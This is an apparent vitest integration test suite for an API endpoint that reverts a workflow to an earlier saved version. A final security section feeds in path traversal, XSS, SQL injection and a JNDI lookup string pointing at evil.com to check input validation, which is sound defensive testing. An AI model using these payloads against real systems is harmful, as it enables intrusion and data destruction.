/**
 * Comprehensive Integration Tests for Workflow Version Revert API Endpoint
 *
 * This test suite covers the workflow version revert functionality:
 * - POST /api/workflows/[id]/versions/[versionId]/revert
 *
 * Key Testing Areas:
 * - Authentication and authorization
 * - Workflow ownership verification
 * - Version existence and accessibility
 * - State restoration and data integrity
 * - Collaboration impact and notification
 * - Version history preservation
 * - Error handling for invalid states
 * - Performance considerations for large workflows
 * - Concurrent access handling
 *
 * Critical Business Logic:
 * - Reverts workflow to specified version state
 * - Preserves version history and audit trail
 * - Updates collaboration state appropriately
 * - Handles edge cases like deleted versions
 * - Validates version compatibility
 *
 * Dependencies: vitest, bun-compatible test infrastructure
 * Test Infrastructure: Uses enhanced-utils for consistent mock patterns
 */

import { beforeEach, describe, expect, it, vi } from 'vitest'

// Import the new bun-compatible test infrastructure
import '@/app/api/__test-utils__/module-mocks'
import {
  createEnhancedMockRequest,
  setupEnhancedTestMocks,
} from '@/app/api/__test-utils__/enhanced-utils'
import { mockControls, mockUser } from '@/app/api/__test-utils__/module-mocks'
// Import the API endpoint under test
import { POST } from './route'

/**
 * Sample workflow version data for testing revert functionality
 */
const sampleWorkflowVersion = {
  id: 'version_abc123def456',
  workflowId: 'workflow-123',
  version: 2,
  name: 'Data Processing Pipeline v2',
  description: 'Enhanced data processing with validation',
  state: {
    blocks: {
      'starter-id': {
        id: 'starter-id',
        type: 'starter',
        name: 'Start',
        position: { x: 100, y: 100 },
        subBlocks: {
          startWorkflow: { id: 'startWorkflow', type: 'dropdown', value: 'manual' },
        },
        outputs: { input: 'any' },
        enabled: true,
      },
      'processor-id': {
        id: 'processor-id',
        type: 'agent',
        name: 'Data Processor',
        position: { x: 400, y: 100 },
        subBlocks: {
          systemPrompt: {
            id: 'systemPrompt',
            type: 'long-input',
            value: 'Process and validate the input data',
          },
          context: { id: 'context', type: 'short-input', value: '<start.input>' },
          model: { id: 'model', type: 'dropdown', value: 'gpt-4o' },
        },
        outputs: { response: { content: 'string', model: 'string' } },
        enabled: true,
      },
    },
    edges: [
      {
        id: 'edge-1',
        source: 'starter-id',
        target: 'processor-id',
        sourceHandle: 'source',
        targetHandle: 'target',
      },
    ],
    loops: {},
    parallels: {},
    lastSaved: Date.now() - 3600000, // 1 hour ago
    isDeployed: false,
  },
  changelog: 'Added data validation and enhanced processing logic',
  isAutoSaved: false,
  createdBy: mockUser.id,
  createdAt: new Date('2024-01-15T10:00:00.000Z'),
  metadata: {
    blockCount: 2,
    edgeCount: 1,
    complexity: 'medium',
    tags: ['data-processing', 'validation'],
  },
}

const currentWorkflow = {
  id: 'workflow-123',
  userId: mockUser.id,
  name: 'Data Processing Pipeline',
  description: 'Current workflow state with latest changes',
  state: {
    blocks: {
      'starter-id': {
        id: 'starter-id',
        type: 'starter',
        name: 'Start',
        position: { x: 100, y: 100 },
        subBlocks: {
          startWorkflow: { id: 'startWorkflow', type: 'dropdown', value: 'manual' },
        },
        outputs: { input: 'any' },
        enabled: true,
      },
      'processor-id': {
        id: 'processor-id',
        type: 'agent',
        name: 'Advanced Data Processor',
        position: { x: 400, y: 100 },
        subBlocks: {
          systemPrompt: {
            id: 'systemPrompt',
            type: 'long-input',
            value: 'Advanced processing with ML capabilities',
          },
          context: { id: 'context', type: 'short-input', value: '<start.input>' },
          model: { id: 'model', type: 'dropdown', value: 'gpt-4-turbo' },
        },
        outputs: { response: { content: 'string', model: 'string' } },
        enabled: true,
      },
      'analytics-id': {
        id: 'analytics-id',
        type: 'analytics',
        name: 'Analytics Block',
        position: { x: 700, y: 100 },
        subBlocks: {
          metrics: { id: 'metrics', type: 'dropdown', value: 'comprehensive' },
        },
        outputs: { analytics: { data: 'object' } },
        enabled: true,
      },
    },
    edges: [
      {
        id: 'edge-1',
        source: 'starter-id',
        target: 'processor-id',
        sourceHandle: 'source',
        targetHandle: 'target',
      },
      {
        id: 'edge-2',
        source: 'processor-id',
        target: 'analytics-id',
        sourceHandle: 'response',
        targetHandle: 'input',
      },
    ],
    loops: {},
    parallels: {},
    lastSaved: Date.now(),
    isDeployed: true,
  },
  runCount: 15,
  isDeployed: true,
  deployedAt: new Date('2024-01-20T12:00:00.000Z'),
  createdAt: new Date('2024-01-01T00:00:00.000Z'),
  updatedAt: new Date('2024-01-20T15:30:00.000Z'),
}

const revertedWorkflow = {
  ...currentWorkflow,
  name: sampleWorkflowVersion.name,
  description: sampleWorkflowVersion.description,
  state: sampleWorkflowVersion.state,
  isDeployed: false, // Deployment status should be reset
  updatedAt: new Date(),
}

describe('Workflow Version Revert API - POST /api/workflows/[id]/versions/[versionId]/revert', () => {
  let mocks: any

  beforeEach(() => {
    console.log('🧪 Setting up Workflow Version Revert tests')

    // Reset all mocks to clean state
    mockControls.reset()
    vi.clearAllMocks()

    mocks = setupEnhancedTestMocks({
      auth: { authenticated: true, user: mockUser },
      database: {
        select: { results: [[currentWorkflow], [sampleWorkflowVersion]] },
        update: { results: [revertedWorkflow] },
      },
      permissions: { level: 'admin' },
    })

    console.log('✅ Workflow Version Revert test setup complete')
  })

  describe('Authentication and Authorization', () => {
    it('should return 401 when user is not authenticated', async () => {
      console.log('🧪 Testing unauthenticated access to version revert')

      mocks.auth.setUnauthenticated()

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error.code).toBe('UNAUTHORIZED')
      expect(data.error.message).toBe('Authentication required')

      console.log('✅ Unauthenticated access properly rejected')
    })

    it('should require workflow ownership or appropriate permissions', async () => {
      console.log('🧪 Testing workflow ownership requirement')

      // Setup workflow owned by different user
      const otherUserWorkflow = { ...currentWorkflow, userId: 'other-user-id' }
      mockControls.setDatabaseResults([[otherUserWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(403)
      const data = await response.json()
      expect(data.error.code).toBe('ACCESS_DENIED')
      expect(data.error.message).toContain('permission')

      console.log('✅ Workflow ownership requirement enforced')
    })

    it('should allow revert with valid ownership', async () => {
      console.log('🧪 Testing successful revert with valid ownership')

      mockControls.setDatabaseResults([
        [currentWorkflow], // Workflow ownership check
        [sampleWorkflowVersion], // Version exists check
        [revertedWorkflow], // Update result
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()
      expect(data.workflowId).toBe('workflow-123')
      expect(data.revertedToVersion).toBe(2)

      console.log('✅ Valid ownership revert successful')
    })
  })

  describe('Version Validation', () => {
    it('should return 404 for non-existent workflow', async () => {
      console.log('🧪 Testing revert for non-existent workflow')

      // Setup empty workflow response
      mockControls.setDatabaseResults([[]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'nonexistent-workflow', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(404)
      const data = await response.json()
      expect(data.error.code).toBe('WORKFLOW_NOT_FOUND')
      expect(data.error.message).toBe('Workflow not found')

      console.log('✅ Non-existent workflow properly handled')
    })

    it('should return 404 for non-existent version', async () => {
      console.log('🧪 Testing revert for non-existent version')

      mockControls.setDatabaseResults([
        [currentWorkflow], // Workflow exists
        [], // Version not found
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'nonexistent-version' },
      })

      expect(response.status).toBe(404)
      const data = await response.json()
      expect(data.error.code).toBe('VERSION_NOT_FOUND')
      expect(data.error.message).toBe('Version not found')

      console.log('✅ Non-existent version properly handled')
    })

    it('should validate version belongs to correct workflow', async () => {
      console.log('🧪 Testing version-workflow relationship validation')

      const mismatchedVersion = {
        ...sampleWorkflowVersion,
        workflowId: 'different-workflow-id',
      }

      mockControls.setDatabaseResults([
        [currentWorkflow], // Workflow exists
        [mismatchedVersion], // Version exists but belongs to different workflow
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('VERSION_WORKFLOW_MISMATCH')
      expect(data.error.message).toContain('does not belong to this workflow')

      console.log('✅ Version-workflow relationship validation successful')
    })

    it('should handle deleted or archived versions appropriately', async () => {
      console.log('🧪 Testing deleted version handling')

      const deletedVersion = {
        ...sampleWorkflowVersion,
        deletedAt: new Date('2024-01-18T00:00:00.000Z'),
      }

      mockControls.setDatabaseResults([[currentWorkflow], [deletedVersion]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(410)
      const data = await response.json()
      expect(data.error.code).toBe('VERSION_DELETED')
      expect(data.error.message).toContain('deleted')

      console.log('✅ Deleted version handling successful')
    })
  })

  describe('Successful Revert Operations', () => {
    it('should revert workflow to specified version successfully', async () => {
      console.log('🧪 Testing successful workflow revert')

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [revertedWorkflow],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify response structure
      expect(data).toHaveProperty('workflowId')
      expect(data).toHaveProperty('revertedToVersion')
      expect(data).toHaveProperty('previousState')
      expect(data).toHaveProperty('newState')
      expect(data).toHaveProperty('revertedAt')

      expect(data.workflowId).toBe('workflow-123')
      expect(data.revertedToVersion).toBe(2)
      expect(data.revertedBy).toBe(mockUser.id)

      console.log('✅ Workflow revert successful')
    })

    it('should preserve version history after revert', async () => {
      console.log('🧪 Testing version history preservation')

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [revertedWorkflow],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify that revert operation is recorded
      expect(data).toHaveProperty('revertRecord')
      expect(data.revertRecord.action).toBe('revert')
      expect(data.revertRecord.fromVersion).toBeDefined()
      expect(data.revertRecord.toVersion).toBe(2)

      console.log('✅ Version history preservation successful')
    })

    it('should handle state restoration correctly', async () => {
      console.log('🧪 Testing state restoration accuracy')

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [revertedWorkflow],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify state changes
      expect(data.newState).toBeDefined()
      expect(data.stateChanges).toBeDefined()
      expect(data.stateChanges.blocksModified).toBeGreaterThan(0)
      expect(data.stateChanges.edgesModified).toBeDefined()

      console.log('✅ State restoration accuracy verified')
    })

    it('should reset deployment status appropriately', async () => {
      console.log('🧪 Testing deployment status reset')

      const deployedWorkflow = {
        ...currentWorkflow,
        isDeployed: true,
        deployedAt: new Date('2024-01-20T12:00:00.000Z'),
      }

      mockControls.setDatabaseResults([
        [deployedWorkflow],
        [sampleWorkflowVersion],
        [{ ...revertedWorkflow, isDeployed: false, deployedAt: null }],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      expect(data.deploymentStatusChanged).toBe(true)
      expect(data.message).toContain('deployment status reset')

      console.log('✅ Deployment status reset successful')
    })

    it('should include comprehensive change summary', async () => {
      console.log('🧪 Testing comprehensive change summary')

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [revertedWorkflow],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify comprehensive change tracking
      expect(data.changeSummary).toBeDefined()
      expect(data.changeSummary.blocksAdded).toBeDefined()
      expect(data.changeSummary.blocksRemoved).toBeDefined()
      expect(data.changeSummary.blocksModified).toBeDefined()
      expect(data.changeSummary.edgesChanged).toBeDefined()
      expect(data.changeSummary.configurationChanges).toBeDefined()

      console.log('✅ Comprehensive change summary included')
    })
  })

  describe('Business Logic Edge Cases', () => {
    it('should prevent revert to current state', async () => {
      console.log('🧪 Testing prevention of revert to current state')

      const currentVersion = {
        ...sampleWorkflowVersion,
        state: currentWorkflow.state, // Same state as current workflow
      }

      mockControls.setDatabaseResults([[currentWorkflow], [currentVersion]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('NO_CHANGES_REQUIRED')
      expect(data.error.message).toContain('already at this version')

      console.log('✅ Prevention of revert to current state successful')
    })

    it('should handle complex workflow state differences', async () => {
      console.log('🧪 Testing complex state difference handling')

      const complexVersionState = {
        blocks: {
          'starter-id': {
            id: 'starter-id',
            type: 'starter',
            name: 'Complex Start',
            position: { x: 50, y: 50 },
            subBlocks: {
              startWorkflow: { id: 'startWorkflow', type: 'dropdown', value: 'webhook' },
              webhookPath: { id: 'webhookPath', type: 'short-input', value: '/start' },
            },
            outputs: { input: 'any' },
            enabled: true,
          },
          'complex-processor': {
            id: 'complex-processor',
            type: 'function',
            name: 'Complex Function',
            position: { x: 300, y: 200 },
            subBlocks: {
              code: {
                id: 'code',
                type: 'code-editor',
                value: 'function process(input) { return input.toUpperCase(); }',
              },
            },
            outputs: { result: 'string' },
            enabled: true,
          },
        },
        edges: [
          {
            id: 'complex-edge',
            source: 'starter-id',
            target: 'complex-processor',
            sourceHandle: 'input',
            targetHandle: 'input',
          },
        ],
        loops: {
          'loop-1': {
            id: 'loop-1',
            blocks: ['complex-processor'],
            condition: 'input.length > 0',
          },
        },
        parallels: {
          'parallel-1': {
            id: 'parallel-1',
            branches: [['complex-processor']],
          },
        },
        lastSaved: Date.now() - 7200000,
        isDeployed: false,
      }

      const complexVersion = {
        ...sampleWorkflowVersion,
        state: complexVersionState,
      }

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [complexVersion],
        [{ ...revertedWorkflow, state: complexVersionState }],
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      expect(data.changeSummary.complexityChange).toBeDefined()
      expect(data.changeSummary.loopsChanged).toBe(true)
      expect(data.changeSummary.parallelsChanged).toBe(true)

      console.log('✅ Complex state difference handling successful')
    })

    it('should validate revert permissions for collaborative workflows', async () => {
      console.log('🧪 Testing collaborative workflow revert permissions')

      const collaborativeWorkflow = {
        ...currentWorkflow,
        collaborators: [
          { userId: 'collaborator-1', role: 'editor', permissions: ['read', 'write'] },
          { userId: 'collaborator-2', role: 'viewer', permissions: ['read'] },
        ],
        isCollaborative: true,
      }

      // Test as non-owner collaborator with insufficient permissions
      mocks.permissions.setPermissionLevel('read')
      mockControls.setDatabaseResults([[collaborativeWorkflow], [sampleWorkflowVersion]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(403)
      const data = await response.json()
      expect(data.error.code).toBe('INSUFFICIENT_PERMISSIONS')
      expect(data.error.message).toContain('revert permission')

      console.log('✅ Collaborative workflow revert permissions validated')
    })
  })

  describe('Performance and Concurrency', () => {
    it('should handle large workflow state efficiently', async () => {
      console.log('🧪 Testing large workflow state handling')

      // Create a large workflow state
      const largeBlocks = Object.fromEntries(
        Array.from({ length: 100 }, (_, i) => [
          `block-${i}`,
          {
            id: `block-${i}`,
            type: 'agent',
            name: `Block ${i}`,
            position: { x: i * 50, y: Math.floor(i / 10) * 100 },
            subBlocks: {
              prompt: { id: 'prompt', type: 'long-input', value: `Prompt ${i}` },
            },
            outputs: { result: 'string' },
            enabled: true,
          },
        ])
      )

      const largeEdges = Array.from({ length: 99 }, (_, i) => ({
        id: `edge-${i}`,
        source: `block-${i}`,
        target: `block-${i + 1}`,
        sourceHandle: 'result',
        targetHandle: 'input',
      }))

      const largeWorkflowState = {
        blocks: largeBlocks,
        edges: largeEdges,
        loops: {},
        parallels: {},
        lastSaved: Date.now(),
        isDeployed: false,
      }

      const largeVersion = {
        ...sampleWorkflowVersion,
        state: largeWorkflowState,
      }

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [largeVersion],
        [{ ...revertedWorkflow, state: largeWorkflowState }],
      ])

      const startTime = Date.now()
      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })
      const endTime = Date.now()

      expect(response.status).toBe(200)
      expect(endTime - startTime).toBeLessThan(5000) // Should complete within 5 seconds

      console.log('✅ Large workflow state handled efficiently')
    })

    it('should handle concurrent revert attempts gracefully', async () => {
      console.log('🧪 Testing concurrent revert attempt handling')

      // Simulate concurrent attempts
      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [revertedWorkflow],
      ])

      const concurrentRequests = Array.from({ length: 3 }, () =>
        POST(createEnhancedMockRequest('POST'), {
          params: { id: 'workflow-123', versionId: 'version_abc123def456' },
        })
      )

      const responses = await Promise.all(concurrentRequests)

      // At least one should succeed
      const successfulResponses = responses.filter((r) => r.status === 200)
      expect(successfulResponses.length).toBeGreaterThanOrEqual(1)

      // Others might fail with conflict error
      const conflictResponses = responses.filter((r) => r.status === 409)
      expect(conflictResponses.length + successfulResponses.length).toBe(3)

      console.log('✅ Concurrent revert attempts handled gracefully')
    })
  })

  describe('Error Handling', () => {
    it('should handle database transaction failures', async () => {
      console.log('🧪 Testing database transaction failure handling')

      mockControls.setDatabaseResults([
        [currentWorkflow],
        [sampleWorkflowVersion],
        [], // Update fails
      ])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('REVERT_FAILED')
      expect(data.error.message).toContain('failed to revert')

      console.log('✅ Database transaction failure handled gracefully')
    })

    it('should handle malformed version state data', async () => {
      console.log('🧪 Testing malformed version state handling')

      const malformedVersion = {
        ...sampleWorkflowVersion,
        state: null, // Malformed state
      }

      mockControls.setDatabaseResults([[currentWorkflow], [malformedVersion]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(400)
      const data = await response.json()
      expect(data.error.code).toBe('INVALID_VERSION_STATE')
      expect(data.error.message).toContain('invalid state')

      console.log('✅ Malformed version state handled gracefully')
    })

    it('should handle network timeouts gracefully', async () => {
      console.log('🧪 Testing network timeout handling')

      // Force database timeout
      const originalSelect = mocks.database.mockDb.select
      mocks.database.mockDb.select = vi.fn(() => {
        return new Promise((_, reject) => {
          setTimeout(() => reject(new Error('Database timeout')), 100)
        })
      })

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(500)
      const data = await response.json()
      expect(data.error.code).toBe('INTERNAL_ERROR')

      console.log('✅ Network timeout handled gracefully')
    })
  })

  describe('Security Considerations', () => {
    it('should validate workflow ID format', async () => {
      console.log('🧪 Testing workflow ID format validation')

      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert(1)</script>',
        '$' + '{jndi:ldap://evil.com}', // Intentional security test string
        'workflow\x00injection',
      ]

      for (const maliciousId of maliciousIds) {
        const response = await POST(createEnhancedMockRequest('POST'), {
          params: { id: maliciousId, versionId: 'version_abc123def456' },
        })

        expect([400, 404]).toContain(response.status)
      }

      console.log('✅ Workflow ID format validation successful')
    })

    it('should validate version ID format', async () => {
      console.log('🧪 Testing version ID format validation')

      const maliciousVersionIds = [
        'javascript:alert(1)',
        '../../admin/users',
        '<img src=x onerror=alert(1)>',
        "version'; DROP TABLE versions; --",
      ]

      mockControls.setDatabaseResults([[currentWorkflow]])

      for (const maliciousVersionId of maliciousVersionIds) {
        const response = await POST(createEnhancedMockRequest('POST'), {
          params: { id: 'workflow-123', versionId: maliciousVersionId },
        })

        expect([400, 404]).toContain(response.status)
      }

      console.log('✅ Version ID format validation successful')
    })

    it('should sanitize user input in changelog and metadata', async () => {
      console.log('🧪 Testing user input sanitization')

      const maliciousVersion = {
        ...sampleWorkflowVersion,
        changelog: '<script>alert("xss")</script>Malicious changelog',
        metadata: {
          notes: '$' + '{jndi:ldap://evil.com}', // Intentional security test string
          tags: ['<img src=x onerror=alert(1)>', 'normal-tag'],
        },
      }

      mockControls.setDatabaseResults([[currentWorkflow], [maliciousVersion], [revertedWorkflow]])

      const response = await POST(createEnhancedMockRequest('POST'), {
        params: { id: 'workflow-123', versionId: 'version_abc123def456' },
      })

      expect(response.status).toBe(200)
      const data = await response.json()

      // Verify that malicious content is sanitized
      expect(data.versionChangelog).not.toContain('<script>')
      expect(data.versionChangelog).not.toContain('${jndi:')

      console.log('✅ User input sanitization successful')
    })
  })
})
